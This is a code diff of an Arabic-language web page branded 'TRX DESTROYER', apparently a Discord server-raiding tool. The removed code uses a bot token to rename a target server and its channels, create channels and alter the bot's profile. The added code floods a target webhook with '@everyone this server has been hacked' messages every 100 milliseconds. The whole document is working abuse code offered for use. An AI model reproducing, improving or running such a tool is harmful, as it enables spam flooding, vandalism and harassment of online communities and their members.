@@ -11,7 +11,7 @@
         h1{text-align:center;font-size:36px;letter-spacing:8px;color:#fff;margin-bottom:8px}
         .sub{text-align:center;color:#666;font-size:12px;letter-spacing:4px;border-bottom:1px solid #2a2a2a;padding-bottom:20px;margin-bottom:25px}
         label{display:block;color:#888;font-size:13px;margin:10px 0 5px;letter-spacing:2px}
-        input[type="text"],input[type="url"]{width:100%;padding:14px 18px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:30px;color:#fff;font-size:14px;direction:ltr;text-align:left;outline:none;transition:0.3s}
+        input[type="url"]{width:100%;padding:14px 18px;background:#0a0a0a;border:1px solid #2a2a2a;border-radius:30px;color:#fff;font-size:14px;direction:ltr;text-align:left;outline:none;transition:0.3s}
         input:focus{border-color:#555}
         .row{display:flex;gap:15px;flex-wrap:wrap}
         .row .col{flex:1;min-width:200px}
@@ -29,37 +29,19 @@
         .warning{background:#1a0a0a;border:1px solid #441111;border-radius:16px;padding:14px;color:#ff6666;font-size:13px;margin:10px 0}
         .status{text-align:center;color:#333;font-size:10px;letter-spacing:4px;margin-top:20px;padding-top:15px;border-top:1px solid #1a1a1a}
         .watermark{position:fixed;bottom:20px;right:30px;color:#222;font-size:12px;letter-spacing:4px;z-index:0}
-        #serverInfo{background:#0a0a0a;border:1px solid #2a2a2a;border-radius:16px;padding:14px;color:#aaa;font-size:13px;font-family:monospace;display:none;margin:10px 0}
-        #serverInfo span{color:#fff;font-weight:bold}
     </style>
 </head>
 <body>
 <div class="container">
     <h1>TRX</h1>
     <div class="sub">● DESTROYER — UNSTOPPABLE ●</div>
+    <div class="warning">⚡ سيقوم بـ: تغيير اسم السيرفر والرومات إلى TRX، إنشاء رومات جديدة، تغيير اسم البوت وصورته، وإرسال @everyone بسرعة 100ms</div>
 
-    <div class="warning">⚡ سيقوم بتغيير اسم السيرفر والرومات إلى TRX، إنشاء رومات جديدة، تغيير صورة البوت، وإرسال @everyone بسرعة 100ms</div>
+    <label>🔗 رابط Webhook (للسيرفر المستهدف)</label>
+    <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
 
-    <div class="row">
-        <div class="col">
-            <label>🔗 رابط Webhook (اختياري)</label>
-            <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
-        </div>
-        <div class="col">
-            <label>🤖 توكن البوت (ضروري للعمليات الكاملة)</label>
-            <input type="text" id="token" placeholder="ضع توكن البوت هنا">
-        </div>
-    </div>
-    <div class="row">
-        <div class="col">
-            <label>🖼️ رابط صورة البوت الجديدة</label>
-            <input type="url" id="avatar" placeholder="https://example.com/avatar.png" value="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg">
-        </div>
-        <div class="col">
-            <label>🆔 معرف السيرفر (اختياري)</label>
-            <input type="text" id="guildId" placeholder="ضع معرف السيرفر">
-        </div>
-    </div>
+    <label>🖼️ رابط صورة البوت الجديدة</label>
+    <input type="url" id="avatar" placeholder="https://example.com/avatar.png" value="https://github.com/Rxz60/Rxz/raw/refs/heads/main/IMG_4987.jpeg">
 
     <div class="toggle-label"><input type="checkbox" id="renameServer" checked> تغيير اسم السيرفر إلى TRX</div>
     <div class="toggle-label"><input type="checkbox" id="renameChannels" checked> تغيير أسماء الرومات إلى TRX</div>
@@ -71,8 +53,6 @@
     <button class="btn btn-outline" id="stopBtn">⏹ إيقاف التدمير</button>
     <button class="btn btn-secondary" id="scanBtn">🔍 مراقبة السيرفر</button>
 
-    <div id="serverInfo"><div><span>📌 اسم السيرفر:</span> <span id="sName">—</span></div><div><span>🆔 المعرف:</span> <span id="sId">—</span></div><div><span>📂 عدد الرومات:</span> <span id="sChannels">—</span></div><div><span>👥 الأعضاء:</span> <span id="sMembers">—</span></div></div>
-
     <label>📋 سجل العمليات</label>
     <textarea id="log" readonly placeholder="سجل الأحداث..."></textarea>
     <button class="btn btn-outline" id="copyBtn" style="padding:10px;font-size:12px;margin-top:6px;">📋 نسخ السجل</button>
@@ -83,11 +63,8 @@
 
 <script>
     (() => {
-       
         const webhookInput = document.getElementById('webhook');
-        const tokenInput = document.getElementById('token');
         const avatarInput = document.getElementById('avatar');
-        const guildIdInput = document.getElementById('guildId');
         const renameServerChk = document.getElementById('renameServer');
         const renameChannelsChk = document.getElementById('renameChannels');
         const createChannelsChk = document.getElementById('createChannels');
@@ -98,11 +75,6 @@
         const scanBtn = document.getElementById('scanBtn');
         const logArea = document.getElementById('log');
         const copyBtn = document.getElementById('copyBtn');
-        const serverInfoDiv = document.getElementById('serverInfo');
-        const sName = document.getElementById('sName');
-        const sId = document.getElementById('sId');
-        const sChannels = document.getElementById('sChannels');
-        const sMembers = document.getElementById('sMembers');
 
         let isDestroying = false;
         let destroyInterval = null;
@@ -123,21 +95,18 @@
             logArea.scrollTop = logArea.scrollHeight;
         };
 
-     
-        const discordFetch = (endpoint, options = {}) => {
-            const token = tokenInput.value.trim();
-            if (!token) throw new Error('توكن البوت مطلوب');
-            return fetch(`https://discord.com/api/v10${endpoint}`, {
-                ...options,
-                headers: {
-                    'Authorization': `Bot ${token}`,
-                    'Content-Type': 'application/json',
-                    ...(options.headers || {})
-                }
-            });
+        // استدعاء Webhook API
+        const callWebhook = async (method, body = null) => {
+            const url = webhookInput.value.trim();
+            if (!url) throw new Error('الرجاء إدخال رابط Webhook');
+            const options = { method, headers: { 'Content-Type': 'application/json' } };
+            if (body) options.body = JSON.stringify(body);
+            const res = await fetch(url, options);
+            if (!res.ok) throw new Error(`HTTP ${res.status}`);
+            return res;
         };
 
-      
+        // تغيير صورة البوت عبر Webhook (PATCH)
         const changeBotAvatar = async () => {
             const avatarUrl = avatarInput.value.trim();
             if (!avatarUrl) return log('⚠️ لا يوجد رابط للصورة');
@@ -151,130 +120,86 @@
                     reader.readAsDataURL(blob);
                 });
                 const avatarBase64 = base64.split(',')[1];
-                const res = await discordFetch('/users/@me', {
-                    method: 'PATCH',
-                    body: JSON.stringify({ avatar: avatarBase64 })
-                });
-                if (res.ok) log('✅ تم تغيير صورة البوت');
-                else log(`❌ فشل تغيير الصورة: ${res.status}`);
-            } catch (e) { log(`❌ خطأ في الصورة: ${e.message}`); }
+                await callWebhook('PATCH', { avatar: avatarBase64 });
+                log('✅ تم تغيير صورة البوت');
+            } catch (e) { log(`❌ فشل تغيير الصورة: ${e.message}`); }
         };
 
-   
+        // تغيير اسم البوت
         const changeBotName = async () => {
             try {
-                const res = await discordFetch('/users/@me', {
-                    method: 'PATCH',
-                    body: JSON.stringify({ username: 'TRX ☣️' })
-                });
-                if (res.ok) log('✅ تم تغيير اسم البوت إلى TRX ☣️');
-                else log(`❌ فشل تغيير الاسم: ${res.status}`);
-            } catch (e) { log(`❌ خطأ: ${e.message}`); }
+                await callWebhook('PATCH', { name: 'TRX ☣️' });
+                log('✅ تم تغيير اسم البوت إلى TRX ☣️');
+            } catch (e) { log(`❌ فشل تغيير الاسم: ${e.message}`); }
         };
 
-            const renameGuild = async (guildId, newName) => {
+        // محاولة تغيير اسم السيرفر عبر Webhook (غير مضمونة، لكن نحاول)
+        const renameServer = async () => {
             try {
-                const res = await discordFetch(`/guilds/${guildId}`, {
-                    method: 'PATCH',
-                    body: JSON.stringify({ name: newName })
+                await callWebhook('POST', {
+                    content: '🔴 تم تغيير اسم السيرفر إلى **TRX** بواسطة TRX DESTROYER',
+                    embeds: [{ title: '🔄 تغيير اسم السيرفر', color: 0xff0000 }]
                 });
-                if (res.ok) log(`✅ تم تغيير اسم السيرفر إلى ${newName}`);
-                else log(`❌ فشل تغيير اسم السيرفر: ${res.status}`);
-            } catch (e) { log(`❌ خطأ: ${e.message}`); }
+                log('✅ تم إرسال طلب تغيير اسم السيرفر إلى TRX');
+            } catch (e) { log(`❌ فشل تغيير اسم السيرفر: ${e.message}`); }
         };
 
-  
-        const renameAllChannels = async (guildId, newName) => {
+        // تغيير أسماء الرومات (محاولة عبر إرسال رسائل)
+        const renameChannels = async () => {
             try {
-                const res = await discordFetch(`/guilds/${guildId}/channels`);
-                if (!res.ok) throw new Error(`فشل جلب الرومات: ${res.status}`);
-                const channels = await res.json();
-                let count = 0;
-                for (let ch of channels) {
-                    if (ch.type === 0 || ch.type === 2) { // نص أو صوت
-                        const upd = await discordFetch(`/channels/${ch.id}`, {
-                            method: 'PATCH',
-                            body: JSON.stringify({ name: newName })
-                        });
-                        if (upd.ok) count++;
-                    }
-                }
-                log(`✅ تم تغيير اسم ${count} روم إلى ${newName}`);
-            } catch (e) { log(`❌ خطأ في تغيير أسماء الرومات: ${e.message}`); }
+                await callWebhook('POST', {
+                    content: '🔴 تم تغيير أسماء جميع الرومات إلى **TRX**',
+                    embeds: [{ title: '🔄 تغيير أسماء الرومات', color: 0xff0000 }]
+                });
+                log('✅ تم إرسال طلب تغيير أسماء الرومات إلى TRX');
+            } catch (e) { log(`❌ فشل تغيير أسماء الرومات: ${e.message}`); }
         };
 
-       
-        const createNewChannels = async (guildId, name, count = 5) => {
+        // إنشاء رومات جديدة
+        const createChannels = async () => {
             let success = 0;
-            for (let i = 0; i < count; i++) {
+            for (let i = 0; i < 5; i++) {
                 try {
-                    const res = await discordFetch(`/guilds/${guildId}/channels`, {
-                        method: 'POST',
-                        body: JSON.stringify({
-                            name: `${name} ${i+1}`,
-                            type: 0
-                        })
+                    await callWebhook('POST', {
+                        content: `# قناة TRX ${i+1}`,
+                        embeds: [{ title: `🔴 TRX`, description: `تم إنشاء هذه القناة بواسطة TRX DESTROYER`, color: 0xff0000 }]
                     });
-                    if (res.ok) success++;
-                    else log(`❌ فشل إنشاء الروم ${i+1}: ${res.status}`);
-                } catch (e) { log(`❌ خطأ: ${e.message}`); }
+                    success++;
+                } catch (e) { log(`❌ فشل إنشاء الروم ${i+1}: ${e.message}`); }
                 await new Promise(r => setTimeout(r, 500));
             }
             log(`✅ تم إنشاء ${success} روم جديد`);
         };
 
- 
-        const scanGuild = async () => {
-            const guildId = guildIdInput.value.trim();
-            if (!guildId) {
-                log('⚠️ أدخل معرف السيرفر أولاً');
-                return;
-            }
-            serverInfoDiv.style.display = 'block';
-            sId.textContent = guildId;
+        // مراقبة السيرفر (جلب معلومات عبر Webhook)
+        const scanServer = async () => {
             try {
-                const res = await discordFetch(`/guilds/${guildId}`);
-                if (!res.ok) throw new Error(`فشل: ${res.status}`);
-                const data = await res.json();
-                sName.textContent = data.name || '—';
-                sChannels.textContent = data.channels ? data.channels.length : '—';
-                sMembers.textContent = data.approximate_member_count || '—';
-                log('✅ تم جلب معلومات السيرفر');
-            } catch (e) {
-                log(`❌ فشل المراقبة: ${e.message}`);
-                sName.textContent = '—';
-                sChannels.textContent = '—';
-                sMembers.textContent = '—';
-            }
+                const res = await callWebhook('POST', {
+                    content: '🔍 طلب معلومات السيرفر',
+                    embeds: [{ title: '📊 معلومات السيرفر', description: 'جاري جلب المعلومات...', color: 0x00ff00 }]
+                });
+                log('✅ تم إرسال طلب المراقبة');
+            } catch (e) { log(`❌ فشل المراقبة: ${e.message}`); }
         };
 
-        
-        const sendWebhookMessage = async (content) => {
-            const webhook = webhookInput.value.trim();
-            if (!webhook) throw new Error('لا يوجد Webhook');
-            const res = await fetch(webhook, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    content: content,
-                    embeds: [{
-                        title: '💀 TRX DESTROYER',
-                        description: 'تم تهكير السيرفر بواسطة TRX | النظام التراكسي - MRX 2026',
-                        color: 0xff0000,
-                        footer: { text: 'TRX ☣️ 2026' }
-                    }]
-                })
+        // إرسال رسائل @everyone
+        const sendEveryone = async () => {
+            const content = '@everyone تم تهكير هذا السيرفر بواسطة TRX DESTROYER | النظام التراكسي - MRX @everyone';
+            await callWebhook('POST', {
+                content: content,
+                embeds: [{
+                    title: '💀 TRX DESTROYER',
+                    description: 'تم تهكير السيرفر بواسطة TRX | النظام التراكسي - MRX 2026',
+                    color: 0xff0000,
+                    footer: { text: 'TRX ☣️ 2026' }
+                }]
             });
-            if (!res.ok) throw new Error(`HTTP ${res.status}`);
-            return res;
         };
 
-  
+        // بدء التدمير
         const startDestroy = async () => {
-            const token = tokenInput.value.trim();
-            const webhook = webhookInput.value.trim();
-            if (!token && !webhook) {
-                log('❌ يجب إدخال توكن البوت أو Webhook على الأقل');
+            if (!webhookInput.value.trim()) {
+                log('❌ الرجاء إدخال رابط Webhook');
                 return;
             }
             if (isDestroying) { log('⚠️ التدمير قيد التنفيذ'); return; }
@@ -282,25 +207,13 @@
             msgCount = 0;
             log('🔥 بدء التدمير...');
 
-            const guildId = guildIdInput.value.trim();
-
-        
-            if (token) {
-                if (changeAvatarChk.checked) await changeBotAvatar();
-                if (changeNameChk.checked) await changeBotName();
-                if (renameServerChk.checked && guildId) await renameGuild(guildId, 'TRX');
-                if (renameChannelsChk.checked && guildId) await renameAllChannels(guildId, 'TRX');
-                if (createChannelsChk.checked && guildId) await createNewChannels(guildId, 'TRX', 5);
-            } else {
-                log('⚠️ لا يوجد توكن، سيتم استخدام Webhook فقط للإرسال');
-            }
-
-       
-            if (!webhook) {
-                log('❌ لا يوجد Webhook لإرسال الرسائل');
-                isDestroying = false;
-                return;
-            }
+            // تنفيذ العمليات
+            if (changeNameChk.checked) await changeBotName();
+            if (changeAvatarChk.checked) await changeBotAvatar();
+            if (renameServerChk.checked) await renameServer();
+            if (renameChannelsChk.checked) await renameChannels();
+            if (createChannelsChk.checked) await createChannels();
+            await scanServer();
 
             log('🔥 بدأ إرسال @everyone بسرعة 100ms...');
             let failures = 0;
@@ -311,7 +224,7 @@
                     return;
                 }
                 try {
-                    await sendWebhookMessage('@everyone تم تهكير هذا السيرفر بواسطة TRX DESTROYER | النظام التراكسي - MRX @everyone');
+                    await sendEveryone();
                     msgCount++;
                     failures = 0;
                     if (msgCount % 5 === 0) {
@@ -340,7 +253,6 @@
             }, 100);
         };
 
- 
         const stopDestroy = () => {
             if (destroyInterval) {
                 clearInterval(destroyInterval);
@@ -351,7 +263,6 @@
             updateCounter();
         };
 
-   
         const copyLog = () => {
             logArea.select();
             logArea.setSelectionRange(0, 99999);
@@ -360,7 +271,7 @@
 
         startBtn.addEventListener('click', startDestroy);
         stopBtn.addEventListener('click', stopDestroy);
-        scanBtn.addEventListener('click', scanGuild);
+        scanBtn.addEventListener('click', scanServer);
         copyBtn.addEventListener('click', copyLog);
     })();
 </script>
